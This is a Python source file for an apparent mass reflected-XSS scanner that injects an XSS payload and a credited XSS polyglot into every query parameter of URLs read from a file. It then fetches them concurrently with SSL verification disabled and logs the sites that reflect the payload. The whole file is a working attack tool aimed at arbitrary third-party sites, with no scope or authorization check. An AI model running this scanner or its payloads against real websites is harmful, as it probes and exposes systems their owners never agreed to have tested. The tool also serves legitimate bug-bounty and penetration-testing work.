import time
import aiohttp
import asyncio
from colorama import Fore
from urllib.parse import urlencode, parse_qs, urlsplit, urlunsplit, urlparse, quote, urlunparse

class MassScanner:
    def __init__(self, file, output , concurrency, timeout, redactDomains=False):
        self.file = file
        self.output = output
        self.payload =  '"><img//////src=x oNlY=1 oNerror=alert(1)//'
        self.encodedPayload = quote(self.payload.replace(" ", "+") , safe="+" )
        self.polygotPayload =  quote(""""jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )////</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e""") # Thanks to @0xsobky - https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
        self.concurrency = concurrency
        self.timeout = timeout
        self.redactDomains = redactDomains
        self.injectables = []
        self.totalFound = 0
        self.totalScanned = 0
        self.t0 = time.time()
    
    def redactURL(self, url):
        parsedUrl = urlparse(url)
        redactedUrl = parsedUrl._replace(netloc="REDACTED")
        return urlunparse(redactedUrl)
 
    def generatePayloadURLs(self,url):
        urlCombinations = []
        scheme, netloc, path, queryString, fragment = urlsplit(url)
        queryParams = parse_qs(queryString, keep_blank_values=True)
        for key in queryParams.keys():
            modifiedParams = queryParams.copy()
            modifiedParams[key] = [self.payload]  # Replace the parameter value with the payload
            modifiedQueryString = urlencode(modifiedParams, doseq=True)
            modifiedUrl = urlunsplit((scheme, netloc, path, modifiedQueryString, fragment))
            urlCombinations.append(modifiedUrl)

        return urlCombinations
    
    def saveInjectablesToFile(self):
        with open(self.output, "a") as f:
            for url in self.injectables:
                f.write(url + "\n")
        self.injectables = []

    async def fetch(self, session:aiohttp.ClientSession, url:str):
        try:
            async with session.get(url, allow_redirects=True, timeout=self.timeout) as resp:
                return (await resp.text() ,   url)
        except Exception as e:
            return ("",   url)
                
    def processTask(self,task):
        self.totalScanned += 1
        responseText , url  = task.result()
        url = url.replace(self.encodedPayload, self.polygotPayload )
        if self.payload in responseText:
            self.injectables.append(url)
            self.totalFound +=1
            print(f"{Fore.RED} [+] Vulnerable parameter found: {Fore.WHITE} {(self.redactURL(url) if self.redactDomains else url)}")

    async def scan(self):
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(verify_ssl=False,limit=0)) as session:
            urlsFile = open(self.file, "r")
            line = urlsFile.readline()
            while line:
                pending = []
                while len(pending) < self.concurrency and line:
                    urlsWithPayload = self.generatePayloadURLs(line.strip())
                    for url in urlsWithPayload:
                        pending.append(asyncio.create_task(self.fetch(session,url)))
                    line = urlsFile.readline()

                done, _ = await asyncio.wait(pending)
                for task in done:
                    self.processTask(task)

                self.saveInjectablesToFile()
            
            urlsFile.close()

    def run(self):

        print(f"{Fore.YELLOW} [i] Starting scan with {self.concurrency} concurrency")
        print(f"{Fore.YELLOW} [i] Output file: {self.output}")
        print(f"{Fore.YELLOW} [i] Timeout: {self.timeout} seconds")

        asyncio.run(self.scan())
        
        print(f"{Fore.YELLOW} [i] Scanning finished. All URLs are saved to {self.output}")
        print(f"{Fore.YELLOW} [i] Total found: {self.totalFound}")
        print(f"{Fore.YELLOW} [i] Total scanned: {self.totalScanned}")
        print(f"{Fore.YELLOW} [i] Time taken: {int(time.time() - self.t0)} seconds")
        
